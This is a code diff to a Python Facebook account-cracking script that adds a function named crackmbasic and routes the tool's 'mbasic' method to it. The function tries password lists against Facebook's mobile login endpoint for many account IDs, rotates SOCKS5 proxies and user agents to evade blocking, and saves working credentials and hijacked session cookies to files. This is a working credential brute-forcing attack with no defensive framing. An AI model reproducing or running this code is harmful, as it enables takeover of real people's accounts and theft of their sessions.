@@ -1297,7 +1297,7 @@ def metslow():
                 elif "reguler" in method:
                     pool.submit(reguler,idf,pwv)
                 elif "mbasic" in method:
-                    pool.submit(mbasic,idf,pwv)
+                    pool.submit(crackmbasic,idf,pwv)
                 else:
                     pool.submit(reguler,idf,pwv)
     print("")
@@ -1364,7 +1364,7 @@ def metcepat():
                 elif "reguler" in method:
                     pool.submit(reguler,idf,pwv)
                 elif "mbasic" in method:
-                    pool.submit(mbasic,idf,pwv)
+                    pool.submit(crackmbasic,idf,pwv)
                 else:
                     pool.submit(reguler,idf,pwv)
     print("")
@@ -1381,6 +1381,53 @@ def metcepat():
     Console().print(f"[bold cyan]   ╰[bold green] OK ─> {ok}	[bold yellow]CP ─> {cp}")
     print("")
 
+
+
+#----------------------[ METHODE-MTOUCH+MOBILE-4 ]-----------------#
+def crackmbasic(idf,pwv):
+    global loop,ok,cp
+    nip=random.choice(prox)
+    proxs= {'http': 'socks5://'+nip}
+    ua = random.choice(ugen2)
+    ses = requests.Session()
+    prog.update(des,description=f" {K2}•{H2} MBASIC {SE}{SE}{idf} [bold blue]{loop}[bold white]/[bold blue]{len(id)} [bold green]OK : [bold green]{ok}  [bold white]-  [bold yellow]CP : [bold yellow]{cp}[white]")
+    prog.advance(des)
+    for pw in pwv:
+        try:
+            if 'ya' in ualuh: ua = ualu[0]
+            ses.headers.update({'Host': 'mbasic.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
+            p = ses.get('https://mbasic.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr')
+            dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://mbasic.facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,}
+            koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
+            koki+=' m_pixel_ratio=2.625; wd=412x756'
+            heade={'Host': 'mbasic.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://mbasic.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://mbasic.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'fr_FR,fr;q=0.9,en-US;q=0.8,en;q=0.7','connection': 'close'}
+            po = ses.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
+            if "checkpoint" in po.cookies.get_dict().keys():
+                tree = Tree(f" ")
+                tree.add(f"[red]{idf}").add(f"[red]{pw}")
+                tree.add(f"[red]{ua}\n")
+                cetak(tree)
+                open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
+                akun.append(idf+'|'+pw)
+                cp+=1
+                break
+            elif "c_user" in ses.cookies.get_dict().keys():
+                headapp={"user-agent":"SupportsFresco=1 Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-J210F Build/MMB29Q) Source/1 [FBAN/EMA;UNITY_PACKAGE/342;FBBV/107586706;FBAV/172.0.0.8.182;FBDV/SM-J210F;FBLC/id_ID;FBOP/20]"}
+                ok+=1
+                coki = ses.cookies.get_dict()
+                kuki = "datr=" + coki["datr"] + ";" + ("sb=" + coki["sb"]) + ";" + "locale=id_ID" + ";" + ("c_user=" + coki["c_user"]) + ";" + ("xs=" + coki["xs"]) + ";" + ("fr=" + coki["fr"]) + ";"
+                tree = Tree(f"  ")
+                tree.add(f"[green]{idf}").add(f"[green]{pw}").add(f"[green]{ua}\n")
+                tree.add(f"[green]{kuki}\n")
+                cetak(tree) 
+                open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
+                break
+            else:
+                continue
+        except requests.exceptions.ConnectionError:
+            time.sleep(31)
+    loop+=1
+	
 
 def validatev2(idf,pwv):
 	global loop,ok,cp
